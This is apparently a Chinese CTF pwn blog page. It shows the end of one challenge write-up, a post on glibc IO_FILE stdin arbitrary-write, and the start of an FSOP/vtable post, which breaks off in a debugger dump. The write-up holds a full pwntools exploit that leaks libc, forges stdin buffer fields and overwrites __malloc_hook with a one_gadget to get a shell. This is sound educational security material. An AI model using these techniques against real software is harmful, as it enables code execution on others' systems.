<p>当把 <code>_IO_buf_base</code> 覆盖为 <code>_IO_buf_end</code> 后，从键盘中输入的应该存放在缓冲区的数据，就会覆盖 <code>_IO_buf_base</code> 作为新的缓冲区结束地址，在这里写入 malloc_hook + 8 后，从键盘中输入的数据就会覆盖到 malloc_hook + 8 的位置，进而劫持 malloc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	p.sendline(<span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># 可以用sendline,也可以用send</span></span><br><span class="line"></span><br><span class="line">payload = p64(malloc_hook + <span class="number">8</span>) + p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc_base + <span class="number">3946352</span>) + p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(libc_base + <span class="number">3938720</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(libc_base + <span class="number">3924992</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x00&#x27;</span>*<span class="number">304</span></span><br><span class="line">payload += p64(libc_base + <span class="number">3923648</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(one_gadget) + p64(realloc)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
<p>刚开始我很不能理解这里循环输入“\x00”的作用</p>
<p>每从输入缓冲区读1个字节数据就将 <code>_IO_read_ptr</code> 加1，当 <code>_IO_read_ptr</code> 等于 <code>_IO_read_end</code> 的时候便会调用 <code>read</code> 读数据到 <code>_IO_buf_base</code> 地址中，而写入 malloc_hook + 8 的时候就导致了 <code>_IO_read_ptr</code> + 8 ，使得条件不成立： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg &amp; *<span class="built_in">stdin</span></span><br><span class="line"><span class="number">0x7f68f09198c0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad208b</span>	<span class="number">0x00007f68f0919901</span></span><br><span class="line"><span class="number">0x7f68f09198d0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x00007f68f0919908</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line">    <span class="comment">/* 注意一下_IO_read_ptr改变了 */</span></span><br><span class="line"><span class="number">0x7f68f09198e0</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x00007f68f0919900</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f09198f0</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x00007f68f0919900</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f0919900</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x00007f68f0919af8</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">/* malloc_hook + 8 已经写入 */</span></span><br></pre></td></tr></table></figure>
<p>而循环输入8次“\x00”后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg &amp; *<span class="built_in">stdin</span></span><br><span class="line"><span class="number">0x7f0af67948c0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad208b</span>	<span class="number">0x00007f0af6794900</span></span><br><span class="line"><span class="number">0x7f0af67948d0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x00007f0af6794900</span>	<span class="number">0x00007f0af6794900</span></span><br><span class="line"><span class="number">0x7f0af67948e0</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x00007f0af6794900</span>	<span class="number">0x00007f0af6794900</span></span><br><span class="line"><span class="number">0x7f0af67948f0</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x00007f0af6794900</span>	<span class="number">0x00007f0af6794900</span></span><br><span class="line"><span class="number">0x7f0af6794900</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x00007f0af6794af8</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f0af6794910</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>发现 <code>_IO_read_ptr</code> 减回去了，分析源码得知：执行 fread 时会重置这些指针字段为 <code>_IO_buf_base</code> ，但是它有时不仅没有重置，反而会继续增加，而有时又会进行重置，不知道原因</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./stackoverflow&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stackoverflow&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.24.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,padding</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;please input the size to trigger stackoverflow: &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;padding and ropchain: &#x27;</span>)</span><br><span class="line">	p.send(padding)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;leave your name, bro:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;worrier 11111111&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;,&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">515410</span></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc=libc_base+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&#x27;malloc_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">success(<span class="string">&#x27;realloc &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;please input the size to trigger stackoverflow: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x5c28e8</span>))</span><br><span class="line">add(<span class="number">0x200000</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;please input the size to trigger stackoverflow: &#x27;</span>)</span><br><span class="line">p.send(p64(malloc_hook+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">one_gadget_list=[<span class="number">0x45526</span>,<span class="number">0x4557a</span>,<span class="number">0xf0a51</span>,<span class="number">0xf18cb</span>]</span><br><span class="line">one_gadget=one_gadget_list[<span class="number">3</span>]+libc_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	p.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">payload = p64(malloc_hook + <span class="number">8</span>) + p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc_base + <span class="number">3946352</span>) + p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(libc_base + <span class="number">3938720</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(libc_base + <span class="number">3924992</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x00&#x27;</span>*<span class="number">304</span></span><br><span class="line">payload += p64(libc_base + <span class="number">3923648</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(one_gadget) + p64(realloc)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这道题算是经典的 stdin 任意写了，覆盖 _IO_buf_end 的操作很巧妙但也很巧合（仅限于libc-2.24），通过这题我算是把 stdin 任意写搞明白了，只是最后的操作真的有点迷，希望知道的大佬可以告诉我一下</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/02/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Astdin%E4%BB%BB%E6%84%8F%E5%86%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/02/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Astdin%E4%BB%BB%E6%84%8F%E5%86%99/" class="post-title-link" itemprop="url">IO_FILE源码分析：stdin任意写</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-02 01:49:41" itemprop="dateCreated datePublished" datetime="2022-04-02T01:49:41+08:00">2022-04-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-03 17:26:07" itemprop="dateModified" datetime="2022-04-03T17:26:07+08:00">2022-04-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="IO-FILE源码分析：stdin任意写"><a href="#IO-FILE源码分析：stdin任意写" class="headerlink" title="IO_FILE源码分析：stdin任意写"></a>IO_FILE源码分析：stdin任意写</h2><p>如果能过伪造这些缓冲区指针，在一定的条件下应该可以完成任意地址的读写</p>
<p>接下来描述这两部分的原理以及给出相应的题目实践，原理介绍部分是基于已经拥有可以伪造IO FILE结构体的缓冲区指针漏洞的基础上进行的，在后续过程假设我们目标写的地址是<code>write_start</code>，写结束地址为<code>write_end</code>，读的目标地址为<code>read_start</code>，读的结束地址为<code>read_end</code></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>字段名称</th>
<th>中文描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>_IO_buf_base</td>
<td>输入输出缓冲区基地址</td>
</tr>
<tr>
<td>_IO_buf_end</td>
<td>输入输出缓冲区结束地址</td>
</tr>
<tr>
<td>_IO_write_base</td>
<td>输出缓冲区基地址</td>
</tr>
<tr>
<td>_IO_write_ptr</td>
<td>输出缓冲区已使用的地址</td>
</tr>
<tr>
<td>_IO_write_end</td>
<td>输出缓冲区结束地址</td>
</tr>
</tbody>
</table>
</div>
<p>简述 fread 的执行过程：</p>
<ul>
<li>第一部分是 <code>fp-&gt;_IO_buf_base</code> 为空的情况，表明此时的FILE结构体中的指针未被初始化，输入缓冲区未建立，则调用 <code>_IO_doallocbuf</code> 去初始化指针，建立输入缓冲区</li>
<li>第二部分是输入缓冲区里有输入并且够用，此时将缓冲区里的数据直接拷贝至目标buff</li>
<li>第三部分是输入缓冲区里的数据为空或者是不能满足全部的需求，则调用 <code>__underflow</code> 调用系统调用读入数据到缓冲区，然后再把数据从缓冲区中复制给用户</li>
</ul>
<p>假设我们能过控制输入缓冲区指针，使得输入缓冲区指向想要写的地址，那么在第三步调用系统调用读取数据到输入缓冲区的时候，也就会调用系统调用读取数据到我们想要写的地址，从而实现任意地址写的目的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_new_file_underflow _IO_file_underflow</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (fp)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN) <span class="comment">/* _flag标志位是否包含_IO_NO_READS */</span></span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>) <span class="comment">/* 调用_IO_doallocbuf分配输入缓冲区 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    _IO_flush_all_linebuffered ();</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化设置FILE结构体指针，将他们都设置成fp-&gt;_IO_buf_base */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">    <span class="comment">/* _IO_SYSREAD == vtable-&gt;_IO_file_read,程序最终会调用read */</span></span><br><span class="line">    <span class="comment">/* 执行read读取数据到fp-&gt;_IO_buf_base,读入大小为输入缓冲区的大小 */</span></span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count; <span class="comment">/* 更新输入缓冲区的大小 */</span></span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将上述条件综合表述为：</p>
<ul>
<li>设置 <code>_IO_read_end</code> 等于 <code>_IO_read_ptr</code></li>
<li>设置 <code>_flag &amp;~ _IO_NO_READS</code> 即 <code>_flag &amp;~ 0x4</code></li>
<li>设置 <code>_fileno</code> 为 0</li>
<li>设置 <code>_IO_buf_base</code> 为 <code>write_start</code> ， <code>_IO_buf_end</code> 为 <code>write_end</code> 且使得 <code>_IO_buf_end-_IO_buf_base</code> 大于fread要读的数据</li>
</ul>
<p>stdin 任意写漏洞的关键就是这几步：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) <span class="comment">/* 利用的前提 */</span></span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">........</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br></pre></td></tr></table></figure>
<ul>
<li>当 <code>_IO_read_ptr</code> &gt;= <code>_IO_read_end</code> 时，程序就会执行系统调用</li>
<li>然后各种指针都会被更新为 <code>_IO_buf_base</code> </li>
<li>最后执行系统调用向 <code>_IO_buf_base</code> 缓冲区输入数据</li>
</ul>
<p>stdin 任意写漏洞，其实就是通过改写 <code>_IO_buf_base</code> 来控制缓冲区的位置，进而控制键盘输入数据的位置（键盘输入的数据先放入缓冲区，再复制到目标位置）</p>
<p>通常程序不能直接在 <code>_IO_buf_base</code> 中写入数据（如果可以直接写入，那不就可以打hook了吗），而是可以对其进行覆盖，小幅度调节它的位置，然后利用新读入的数据去覆盖 <code>_IO_buf_end</code> 等其他字段，进而控制程序</p>
<hr>
<p>讲起来有点抽象，其实我看 raycp 师傅的博客时就不是很明白，但去把博客上附带的那道例题复现了之后就清晰了不少</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/01/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9AFSOP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/01/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9AFSOP/" class="post-title-link" itemprop="url">IO_FILE源码分析：FSOP</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-01 15:52:48" itemprop="dateCreated datePublished" datetime="2022-04-01T15:52:48+08:00">2022-04-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-08-23 09:26:35" itemprop="dateModified" datetime="2022-08-23T09:26:35+08:00">2022-08-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="IO-FILE源码分析：FSOP"><a href="#IO-FILE源码分析：FSOP" class="headerlink" title="IO_FILE源码分析：FSOP"></a>IO_FILE源码分析：FSOP</h2><p><strong>vtable</strong></p>
<p>IO_FILE结构体里面有个很重要的数据结构 —— vtable</p>
<p>vtable 采用虚表调用的形式，如果劫持了 vtable ，就可以调用我们需要的任意函数，甚至可以伪造 vtable ，使程序错误使用我们构造的 fake vtable </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x*(struct _IO_FILE_plus*)_IO_list_all</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">0xfbad2086</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x7ffff7dd2620</span>, <span class="comment">// 指向下一个链表节点(stderr的下一个:stdout)</span></span><br><span class="line">    _fileno = <span class="number">0x2</span>, <span class="comment">// fileno值为2(标准错误流的文件描述符就是&#x27;2&#x27;)</span></span><br><span class="line">    _flags2 = <span class="number">0x0</span>,</span><br><span class="line">    _old_offset = <span class="number">0xffffffffffffffff</span>,</span><br><span class="line">    _cur_column = <span class="number">0x0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0x0</span>,</span><br><span class="line">    _shortbuf = &#123;<span class="number">0x0</span>&#125;,</span><br><span class="line">    _lock = <span class="number">0x7ffff7dd3770</span>,</span><br><span class="line">    _offset = <span class="number">0xffffffffffffffff</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span 